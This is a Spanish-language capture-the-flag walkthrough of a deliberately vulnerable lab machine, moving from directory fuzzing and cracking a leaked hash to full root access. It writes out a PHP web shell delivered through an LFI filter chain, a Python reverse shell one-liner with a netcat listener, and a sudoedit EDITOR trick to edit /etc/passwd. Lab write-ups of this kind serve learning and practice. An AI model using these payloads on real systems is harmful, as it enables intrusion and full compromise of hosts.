## Reconocimiento:

Puerto 80 : HTTP

En la web hay un panel de login, intento automatizar la SQLI con Sqlmap pero no es vulnerable, así que aplico un fuzzing de directorios:

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirb/big.txt -x html,php,txt -t 100 -k
```

Interesa /bachup.

Dentro hay un archivo zip con todo el contenido del servicio. Interesa la carpeta /db:

```bash
cd db
cat clinic_queuing_db.db
```

Dentro encuentro un posible usuario ( Jessica Castro ) y un hash:

```
$2y$10$iDHQftaCCEPmdPj/11E3DOGiw3AsOPf6uYBpEAuh8J19oeGuloJIK
```

Creo un diccionario con el username utilizando esta herramienta:

https://github.com/urbanadventurer/username-anarchy

```
./username-anarchy -i username.txt > users.txt
```

Y ese archivo lo utilizo para crackear el hash utilizando John:

```
john --wordlist=users.txt hash
```

Pass : j.castro

Ingreso a un dashboard donde la URL lleva un parámetro llamado ?page=, así que probaré un LFI:

```bash
python3 php_filter_chain_generator.py --chain '<?php echo shell_exec($_GET["cmd"]);?>'
```

El output será <CONTENT_GENERATE> ya que es muy extenso.

Lo probamos en la URL:

```bash
http://172.17.0.2/?cmd=ls -la&page=<CONTENT_GENERATE>
```

Funciona, por lo tanto toca enviar una rev shell. 

Me pongo a la escucha:

```bash
nc -lnvp 4444
```

En este caso usaré Python:

```bash
http://172.17.0.2/?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.17.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'&page=<CONTENT_GENERATE>
```

Y recibo conexión.

## Escalada www-data → jessica

Se reutiliza la contraseña:

```bash
su jessica : j.castro
```

## Escalada jessica → root

```bash
sudo -l
(root) NOPASSWD: sudoedit /var/www/html/*
```

Interesa editar el archivo passwd, por lo tanto lo exporto:

```bash
export EDITOR='nano -- /etc/passwd'
```

Ejecuto lo siguiente:

```bash
sudo sudoedit /var/www/html/testfile
```

Abrirá el archivo passwd, así que toca quitar la “x” de usuario root. Lo guardo y salgo:

```bash
su root
```

Listo.
